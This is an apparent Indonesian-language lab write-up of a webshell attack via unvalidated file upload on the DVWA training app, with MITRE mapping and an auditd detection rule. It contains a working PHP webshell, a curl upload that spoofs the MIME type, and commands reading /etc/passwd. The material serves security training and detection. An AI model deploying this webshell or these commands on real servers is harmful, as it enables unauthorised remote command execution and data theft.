# File Upload Webshell Attack

## Deskripsi
Attacker mengupload file PHP berbahaya ke server melalui fitur
upload yang tidak divalidasi, kemudian mengeksekusi command
di server korban.

## MITRE ATT&CK
- Tactic: Persistence
- Technique: T1505.003 — Web Shell

## Attack Steps

### Step 1 — Buat Webshell
```bash
cat > /tmp/shell.php << 'SHELL'
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
SHELL
```

### Step 2 — Upload via DVWA
```bash
SESS="PHPSESSID=YOUR_SESSION; security=low"
curl -s "http://192.168.217.130/DVWA/vulnerabilities/upload/" \
  -b "$SESS" \
  -F "uploaded=@/tmp/shell.php;type=image/jpeg" \
  -F "Upload=Upload"
```

### Step 3 — Eksekusi Command
```bash
# Akses webshell
curl "http://192.168.217.130/DVWA/hackable/uploads/shell.php?cmd=id"
curl "http://192.168.217.130/DVWA/hackable/uploads/shell.php?cmd=whoami"
curl "http://192.168.217.130/DVWA/hackable/uploads/shell.php?cmd=cat+/etc/passwd"
```

## Detection
- Rule ID: 100053 (Auditd — file upload)
- Level: 14 (Critical)
- Log Source: Auditd key=webshell_upload
